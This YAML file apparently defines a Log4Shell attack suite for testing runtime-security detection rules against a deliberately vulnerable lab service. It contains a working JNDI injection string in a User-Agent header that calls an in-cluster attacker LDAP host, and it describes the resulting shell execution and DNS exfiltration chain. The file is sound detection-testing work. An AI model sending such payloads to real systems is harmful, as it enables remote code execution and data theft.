apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: log4j-chain-attacks
  description: >-
    Log4Shell (CVE-2021-44228) attack suite for bobctl autotune. Delivery is
    HTTP into the chain-frontend (nginx) which proxies to chain-backend (Java +
    log4j 2.14.1); the malicious JNDI string rides the User-Agent header and is
    interpolated by log4j's message lookup → outbound LDAP to attacker-ns →
    Payload class load → /bin/sh exec chain (psql → base32 → getent DNS exfil)
    INSIDE the chain-backend container.

    The tuned profile is replicaset-chain-backend; its container is named
    `backend` (the Deployment is chain-backend — the alert container_name label
    is `backend`, which is what expectedDetections must match).
    The benign baseline is the Java app serving /api/* over JDBC — it never
    shells out — so the attack's sh/psql/getent spawn is an unexpected process
    in that profile and fires R0001.

    Detection narrative (scenario A = vulnerable, eclipse-temurin + log4j 2.14.1
    + /bin/sh present):
      R0001 — unexpected process launched (sh/psql/getent under java) ON chain-backend.
    Config/scenario-dependent (NOT asserted — see comments on s2):
      R0011 — egress to attacker:1389 / DNS exfil. Requires node-agent
              networkEventsStreaming enabled; off by default on this cluster.
      R0010 — sensitive-file read. Only the /etc/shadow Payload variant trips it;
              the shipped Payload reads the postgres row, not /etc/shadow.
      R1100 — failed-execve ENOENT, scenario B (distroless) only.

target:
  service: chain-frontend
  namespace: log4j-poc
  port: 8080
  protocol: http

attacks:
  # ── Phase 1: RECON — benign auth probe (exercises the JWT path) ──────────────
  - name: s1-recon-benign-login
    type: probe
    http:
      method: POST
      path: /api/login
      headers:
        Content-Type: application/json
      body: '{"user":"alice@example.com","pass":"<stolen>"}'
    successIndicators:
      - statusCode: 200
    expectedDetections: []   # benign — no detection expected

  # ── Phase 2: EXPLOIT — Log4Shell JNDI in User-Agent ─────────────────────────
  # The vulnerable line is chain-backend App.java:
  #   log.info("product query q={} ua={}", q, ua)
  # log4j 2.14.1 interpolates ${jndi:ldap://…} → LDAP fetch → Payload.class →
  # Runtime.exec("/bin/sh", …) → psql/getent. None of those processes are in the
  # Java app's learned baseline, so R0001 fires on chain-backend.
  - name: s2-jndi-in-user-agent
    type: jndi-injection
    http:
      method: GET
      path: /api/products
      queryParams:
        q: test
      headers:
        User-Agent: '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}'
    successIndicators:
      - statusCode: 200
    expectedDetections:
      # Unpinned command (no `command:`): the JNDI exec chain spawns sh → psql →
      # base32 → tr → getent and which kernel comm trips R0001 first is not
      # stable across runs (skill rules #8/#10 — don't pin comm for multi-process
      # exec chains). Match on rule + container only.
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: backend
